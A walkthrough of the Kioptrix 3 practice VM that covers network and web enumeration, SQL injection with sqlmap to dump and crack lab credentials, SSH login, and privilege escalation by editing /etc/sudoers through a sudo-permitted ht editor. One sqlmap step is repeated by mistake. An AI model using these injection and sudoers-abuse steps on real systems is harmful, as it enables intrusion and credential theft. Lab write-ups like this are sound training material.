# NetDiscover

First thing after you have imported box and configured to use your NAT network, you will need to identify it's IP address.

```js
netdiscover -r 192.168.1.1/24
```

This command will show you all available IP addresses running on your NAT subnet



### Entry to DNS file

After you have run the netdiscover scan to identify Kioptrix3 box you have to add entry to host file, as the box creator instructs you to do so.

  ```js
  echo "192.168.1.135 kioptrix3.com" >> /etc/hosts
  
  ```
  
  
### Network Enumeration

Starting with nmap scan with version and script scan to identify running ports and those version and software behind them 

```js
nmap -sC -sV 192.168.1.135 -oN nmap/initial_scan.txt

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 14:33 EDT
Nmap scan report for kioptrix3.com (192.168.1.135)
Host is up (0.0028s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We got back results with two open ports running:
<ul> 
  <li> TCP/22 - SSH with version OpenSSH 4.7p1
  <li> TCP/80 - HTTP Apache httpd 2.2.8; PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
</ul>
  
<p>As we see can see there is some information disclosure on HTTP and this will help us possibly find potential attack surface.
  Also looking more in scan we see that nmap was also identify that PHPSESSID httponly is not set</p>
  
 ### HTTP Enumeration
 
 <p>Usually I start to inspect the page while my I run directory brute force and Web server scan with Nikto, and also before exploring site, I like to turn on burp spider and set target scope to build full sitemap for later inspection of HTTP headers and maybe other interesting data...</p>

#### Nikto
 ```js
 nikto -host http://kioptrix3.com | tee web/Nikto_scan.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.135
+ Target Hostname:    kioptrix3.com
+ Target Port:        80
+ Start Time:         2022-11-03 14:37:30 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 7784 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2022-11-03 14:37:53 (GMT-4) (23 seconds)
 
 ```
#### Directory Brute Force with gobuster

```js
gobuster dir -u http://kioptrix3.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 | tee web/initial_scan.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://kioptrix3.com
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/03 14:42:49 Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 355] [--> http://kioptrix3.com/modules/]
/gallery              (Status: 301) [Size: 355] [--> http://kioptrix3.com/gallery/]
/data                 (Status: 403) [Size: 324]                                    
/core                 (Status: 301) [Size: 352] [--> http://kioptrix3.com/core/]   
/style                (Status: 301) [Size: 353] [--> http://kioptrix3.com/style/]  
/cache                (Status: 301) [Size: 353] [--> http://kioptrix3.com/cache/]  
/phpmyadmin           (Status: 301) [Size: 358] [--> http://kioptrix3.com/phpmyadmin/]
/server-status        (Status: 403) [Size: 333]
```
<p>So far we have gathered a lot of information and we already see that we have web gui for MySQL database management under /phpmyadmin, when opening default page on site we are presented with <strong>Ligoat Security</strong> page
  
  ![image](https://user-images.githubusercontent.com/85706972/200402410-83f55983-63fb-4890-ad6a-26cca8d4cfab.png)

 
 <p>If we inpsect the source code under this page we see that LotusCMS is written down in HTML metadata</p>
 
 ![image](https://user-images.githubusercontent.com/85706972/200402696-6b68d285-2b4e-40cf-b4c1-a83663b5903c.png)

 
 <p>This means that we are dealing with some sort of Content Management System, but we are not sure what version is running, so lets keep investigate what else we might find..
  <p>Following the path of hyperlink on main page we are brough to /gallery section where we are presented with some sort of pictures</p>
    
    
![image](https://user-images.githubusercontent.com/85706972/200408495-0080ae90-7237-4db6-a4d8-429ab5de64b4.png)
    
While I was exploring new path, I run one more directory brute force scan with gobuster and this time including php file extension
    
```js
 gobuster dir -u http://kioptrix3.com/gallery -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://kioptrix3.com/gallery
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/11/07 15:42:54 Starting gobuster in directory enumeration mode
===============================================================
/search.php           (Status: 500) [Size: 725]
/index.php            (Status: 500) [Size: 5652]
/login.php            (Status: 500) [Size: 1998]
/register.php         (Status: 500) [Size: 725] 
/profile.php          (Status: 500) [Size: 1560]
/themes               (Status: 301) [Size: 362] [--> http://kioptrix3.com/gallery/themes/]
/photos               (Status: 301) [Size: 362] [--> http://kioptrix3.com/gallery/photos/]
/photos.php           (Status: 500) [Size: 1483]                                          
/gallery.php          (Status: 200) [Size: 1654]                                          
/p.php                (Status: 500) [Size: 1483]                                          
/g.php                (Status: 500) [Size: 3143]                                          
/tags.php             (Status: 500) [Size: 3213]                                          
/vote.php             (Status: 200) [Size: 32]                                            
/recent.php           (Status: 500) [Size: 2441]                                          
/logout.php           (Status: 500) [Size: 2085]                                          
/slideshow.php        (Status: 500) [Size: 725]
    
```
Now that we do have more information about files under /gallery directory, I started to explore some of availabe files that status code weren't 500, for example <em>gallery.php</em> was the one with which lead me to find SQL injection point in <strong>id</strong> parameter

![image](https://user-images.githubusercontent.com/85706972/200410064-47d8b3a9-a30e-49f8-aa16-0f40cbaf8aae.png)

From here we can start to automate the process and try to exploit the vulnerability with sqlmap

## Getting User Shell
#### SQLMAP Scan

As I was not sure with type of database we are working I started scan with simple banner grabbing

```js
sqlmap "http://kioptrix3.com/gallery/gallery.php?id=1" -p id --cookie="provide cookie here" --risk=3 --level=3 --random-agent -b
```
![image](https://user-images.githubusercontent.com/85706972/200410437-338b2841-3efa-4877-84b1-732c2d8feb7c.png)

Next scan was to identify current database name

```js
sqlmap "http://kioptrix3.com/gallery/gallery.php?id=1" -p id --cookie="provide cookie here" --risk=3 --level=3 --random-agent --dbms MySQL --current-db

```
After we found that database name which is <strong>gallery</strong> we can query for tables in next scan

```js
sqlmap "http://kioptrix3.com/gallery/gallery.php?id=1" -p id --cookie="provide cookie here" --risk=3 --level=3 --random-agent --dbms MySQL --current-db
```

![image](https://user-images.githubusercontent.com/85706972/200410910-5ce21a11-081e-49b0-b2d2-5b7acfa01647.png)

The one we are interested in is <em>dev_accounts</em>, so next scan we are going to dump all and if find any creds, crack them using the same tool

```js
sqlmap "http://kioptrix3.com/gallery/gallery.php?id=1" -p id --cookie="provide cookie here" --risk=3 --level=3 --random-agent --dbms MySQL -D gallery -T dev_accounts --dump-all
```

After some time, we do find credentials which were crack by sqlmap 

![image](https://user-images.githubusercontent.com/85706972/200411289-9dd75a93-fa9c-4ce4-92b0-dffdcc1a5808.png)

```js
dreg : Mast3r
loneferret : starwars
```

Using found credentials we can try to login with ssh as the port was open, and as you can see the loneferret user login was successfull

![image](https://user-images.githubusercontent.com/85706972/200411448-93293cee-7169-479e-aec7-aefe54b0dcc2.png)


## Privilege Escalation

Checking sudo privileges on current user we see that we have sudo permission over <srong>/usr/local/bin/ht</string>

![image](https://user-images.githubusercontent.com/85706972/200413993-dc2f7138-054b-4606-aebd-6b4881be4b3e.png)

Following permissions means that this user have sudo permission to the xterm-256color text editor, abusing this we can attempt to edit <strong>/etc/sudoers</strong> file so we can elevate our privileges.
  
```js
sudo ht /etc/sudoers 
#You will get this error 
Error opening terminal: xterm-256color.

#Fix error
export TERM=xterm-color
sudo ht /etc/sudoers 
```

Those commands should open us the following text editor

![image](https://user-images.githubusercontent.com/85706972/200416517-135c86c4-33f5-4c22-bba9-afbf4c30f069.png)


From here press ALT+ and with arrows keys navigate to Open, and then press Enter, this will give us option to enter file name and we want to open following file <strong>/etc/sudoers</strong> 

![image](https://user-images.githubusercontent.com/85706972/200415553-af31881c-e733-40ac-847a-192eafa895ef.png)

Now that file is open, at the line where you see name of currently logged on user "loneferret" at end of that line after "," add /bin/sh, this will allow us to evalate our privileges to root

![image](https://user-images.githubusercontent.com/85706972/200415840-5d978401-8db8-4201-885e-8698b6e78a6f.png)

Once that is done press ALT+F > Save > CTRL+Z to exit
Now that this is done, we can exploit our changes and get root shell

![image](https://user-images.githubusercontent.com/85706972/200416004-c6096fc1-526a-4b8e-b865-ac9b4c4af300.png)





